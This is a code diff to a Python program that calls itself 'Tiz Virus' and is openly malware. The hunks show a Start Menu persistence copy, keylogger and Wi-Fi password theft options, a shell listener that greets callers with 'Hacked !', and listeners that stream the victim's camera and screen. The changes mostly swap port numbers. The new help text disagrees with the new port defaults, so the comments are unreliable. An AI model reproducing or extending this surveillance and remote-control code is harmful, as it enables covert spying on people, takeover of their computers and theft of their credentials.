@@ -18,12 +18,12 @@ copyfile('virus.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/
 def parseargs():
     cli_args = argparse.ArgumentParser(description="Tiz Virus")
     cli_args.add_argument('--host',help="listening ip, no need to change", default='0.0.0.0', type=str)
-    cli_args.add_argument('--port',help="stream port, reverse shell port = stream port +1", default=5000, type=int)
+    cli_args.add_argument('--port',help="revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
     cli_args.add_argument('--keylog',help="keylog=t create a keylogger file / keylog=f don\'t create the file", default="t", type=str)
     cli_args.add_argument('--wifi',help="wifi=t create a file with all wifis password / wifi=f don't create the file", default="t", type=str)
+    cli_args.add_argument('--shell',help="shell=t revershell on port (default = 5000)/ shell=f don't revershell", default="t", type=str)
     cli_args.add_argument('--camera',help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream", default="t", type=str)
     cli_args.add_argument('--screen',help="screen=t stream screen on port+2 (default = 5002)/ screen=f don't stream", default="t", type=str)
-    cli_args.add_argument('--shell',help="shell=t revershell on port (default = 5000)/ shell=f don't revershell", default="t", type=str)
     options = cli_args.parse_args(sys.argv[1:])
     return options
 
@@ -67,11 +67,11 @@ def retreive_screenshot(conn):
             conn.send(size_bytes)
             # Envoi des pixels compressés
             conn.sendall(pixels)
-def screen_sender(host='0.0.0.0', port=5000):
+def screen_sender(host='0.0.0.0', port=5001):
     with socket.socket() as sock:
         sock.bind((host, port))
         sock.listen(5)
-        print('Server started.')
+        print('screen sender started.')
         while 'connected':
             conn, addr = sock.accept()
             #print('Client connected IP:', addr)
@@ -79,12 +79,12 @@ def screen_sender(host='0.0.0.0', port=5000):
             threadscreen2.start()
 
 
-def R_tcp(host='0.0.0.0', port=5001):
+def R_tcp(host='0.0.0.0', port=5000):
   s = socket.socket()
   BUFFER_SIZE = 1024
   s.bind((host, port))
   s.listen(5)
-  print(f"Listening as {host}:{port} ...")
+  print(f"Revershell started.")
   client_socket, client_address = s.accept()
   print(f"{client_address[0]}:{client_address[1]} Connected!")
   message = "Hacked !".encode()
@@ -117,12 +117,12 @@ def capturevid(conn):
     cap.release()
     cv2.destroyAllWindows()
     conn.close()
-def camsender(port=5000):
+def camsender(port=5002):
     host="0.0.0.0"
     with socket.socket() as sock:
         sock.bind((host, port))
         sock.listen(5)
-        print('Server started.')
+        print('camera sender started.')
 
         while 'connected':
             conn, addr = sock.accept()
@@ -141,16 +141,16 @@ if __name__ == "__main__":
     #recup wifipass
     if (options.wifi=="t"):
         wifipass()
+    #Reverse shell tcp 
+    if (options.shell=="t"):
+        threadshell = threading.Thread(target=R_tcp,args=(options.host,options.port)) #port 5000
+        threadshell.start()
     #screen sender udp
     if (options.screen=="t"):
         WIDTH = 1900
         HEIGHT = 1000
-        threadscreen = threading.Thread(target=screen_sender,args=(options.host,options.port)) # port 5000
+        threadscreen = threading.Thread(target=screen_sender,args=(options.host,options.port+1)) # port 5001
         threadscreen.start()
-    #Reverse shell tcp 
-    if (options.shell=="t"):
-        threadshell = threading.Thread(target=R_tcp,args=(options.host,options.port+1)) #port 5001
-        threadshell.start()
     #camera sender udp
     if (options.camera=="t"):
         MAX_DGRAM = 2**16
